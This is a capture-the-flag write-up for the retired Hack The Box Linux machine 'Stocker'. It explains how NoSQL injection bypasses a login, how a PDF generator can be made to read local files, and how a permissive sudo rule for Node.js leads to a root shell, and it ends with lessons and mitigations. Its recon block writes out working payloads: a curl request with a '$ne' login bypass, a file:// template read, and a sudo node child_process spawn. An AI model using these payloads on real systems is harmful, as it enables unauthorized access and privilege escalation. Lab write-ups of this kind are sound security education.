---
machine: Stocker
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, nosql, ssrf, pdf, node, sudo]
---

# Stocker — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

NoSQL injection in the development login grants access. PDF purchase-order generation is vulnerable to SSRF/file read and exposes code and a reused SSH password. A sudo rule running Node.js scripts without restrictions allows arbitrary code as root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,443 <IP>
ffuf -u http://stocker.htb -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# NoSQL
curl -s -X POST http://dev.stocker.htb/login -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# PDF / file read
curl -s -X POST http://dev.stocker.htb/api/order -d '{"template":"file:///var/www/dev/index.js"}'
# Sudo node
sudo -l
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:"inherit"})'
```

## Enumeration

- Development vhost with a MongoDB login.
- PDF generator loading resources by URL or path.
- Sudo rule to run a Node.js script.

## Initial access

On the development vhost, send a JSON object with MongoDB operators (`$ne`, `$gt`) and bypass the login. The panel generates a PDF; the template or URL parameter reaches local files and the application source.

## Privilege escalation

The source contains database credentials and a password reused by the system user, valid over SSH. `sudo -l` shows a Node.js wrapper allowing arbitrary JavaScript; launch a shell with `child_process` and obtain root.

## Evidence

- Successful NoSQL login with an operator.
- PDF with a local file and SSH password.
- `sudo node` running `child_process` as root.

## Lessons learned

- NoSQL operators change authentication logic.
- A PDF generator can read files and perform SSRF.
- Allowing arbitrary Node.js with sudo is root.

## Mitigation and detection

- Validate types and reject operators at login.
- Isolate the PDF generator and block `file://`.
- Do not allow full interpreters in sudo rules.

## References

- [0xdf — Stocker](https://0xdf.gitlab.io/2023/06/24/htb-stocker.html)
- [Node.js — Command-line options](https://nodejs.org/api/cli.html)
- [Hack The Box — Stocker](https://app.hackthebox.com/machines/stocker)
